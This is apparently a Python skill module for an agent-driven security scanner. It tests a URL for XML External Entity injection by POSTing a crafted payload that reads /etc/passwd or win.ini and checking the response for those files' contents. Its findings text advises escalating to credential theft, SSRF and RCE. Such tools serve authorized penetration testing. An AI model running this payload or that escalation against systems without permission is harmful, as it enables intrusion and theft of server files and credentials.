"""XXE — XML External Entity injection: making an XML parser read server files for you.

check_xxe POSTs a crafted XML document that declares an external entity pointing at a local file
(file:///etc/passwd, Windows win.ini) and expands it in the document body. If the endpoint's parser
resolves external entities, the file's contents come back in the response — confirmed by an exact
file-content signature, so a hit is a real local file read (XXE often escalates to SSRF and RCE).
Active (sends crafted POST bodies) so it is gated. Pure-stdlib (urllib), CI-safe, $0. Confirm and
scope the read before reporting.
"""

from __future__ import annotations

import asyncio
import re
import urllib.error
import urllib.request
from typing import Any

from friday.skills.registry import skill

# (target file, success signature, OS, XML body). Signatures are specific enough that a match is a
# real file read, not an echo of the payload.
_TARGETS: list[tuple[str, re.Pattern[str], str]] = [
    ("file:///etc/passwd", re.compile(r"root:.*?:0:0:", re.I), "linux"),
    ("file:///c:/windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I), "windows"),
]
_CONTENT_TYPES = ("application/xml", "text/xml")


def _payload(uri: str) -> str:
    """Classic external-general-entity XXE document for the given file URI."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE sutra [<!ENTITY xxe SYSTEM "{uri}">]>\n'
        "<sutra>&xxe;</sutra>"
    )


def _probe(url: str, body: str, ctype: str) -> tuple[int, str, str | None]:
    """(status, response text, error) for a crafted XML POST."""
    req = urllib.request.Request(
        url,
        data=body.encode(),
        headers={"User-Agent": "sutra-xxe/1.0", "Content-Type": ctype, "Accept": "*/*"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:  # noqa: S310 — authorized target
            return r.status, r.read(500_000).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as e:
        try:
            text = e.read(500_000).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            text = ""
        return e.code, text, None
    except (urllib.error.URLError, OSError) as e:
        return 0, "", str(e)[:160]


@skill(
    name="check_xxe",
    description=(
        "Test an endpoint for XXE (XML External Entity) injection — making an XML parser read "
        "local server files. POSTs a crafted XML document declaring an external entity pointing at "
        "file:///etc/passwd (and the Windows win.ini), and checks the response for a real "
        "file-content signature. A hit is a confirmed local file read (XXE escalates to SSRF and "
        "sometimes RCE). Tries application/xml and text/xml. Active (crafted POST bodies) — "
        "authorized targets only; the endpoint must accept an XML body."
    ),
    auto_confirm=False,  # sends crafted XML POST bodies — gated
    timeout_s=60,
)
async def check_xxe(url: str) -> dict[str, Any]:
    """Probe an endpoint for XXE file disclosure.

    url: the target endpoint that parses XML (e.g. an API that accepts an XML POST body).
    """
    url = (url or "").strip()
    if not url:
        return {"error": "no url to test"}
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    def _run() -> tuple[list[dict[str, Any]], bool]:
        hits: list[dict[str, Any]] = []
        reachable = False
        for uri, sig, os_ in _TARGETS:
            body = _payload(uri)
            found = False
            for ctype in _CONTENT_TYPES:
                status, text, err = _probe(url, body, ctype)
                if err is None:
                    reachable = True
                m = sig.search(text or "")
                if m:
                    hits.append(
                        {"target": uri, "os": os_, "content_type": ctype, "status": status,
                         "evidence": m.group(0)[:120], "payload": body}
                    )
                    found = True
                    break
            if found:
                continue
        return hits, reachable

    hits, reachable = await asyncio.to_thread(_run)
    if not reachable:
        return {"error": f"could not reach {url}", "url": url}

    findings = [
        {
            "id": "xxe",
            "severity": "high",
            "matched_at": url,
            "name": f"XXE file disclosure ({h['os']})",
            "description": (
                f"The endpoint resolves external XML entities: a {h['os']} payload "
                f"({h['content_type']}) returned the target file's contents (HTTP {h['status']}, "
                f"matched '{h['evidence']}'). Confirmed local file read — escalate to config/cred "
                "theft, SSRF via http(s) entities, or RCE (PHP expect/parameter entities)."
            ),
        }
        for h in hits
    ]

    return {
        "url": url,
        "hits": hits,
        "findings": findings,
        "vulnerable": bool(findings),
        "note": (
            "Confirmed by an exact file-content signature. Escalate the read (config/creds), try "
            "SSRF via an http:// entity, and check for OOB/blind XXE before reporting impact."
        ),
    }
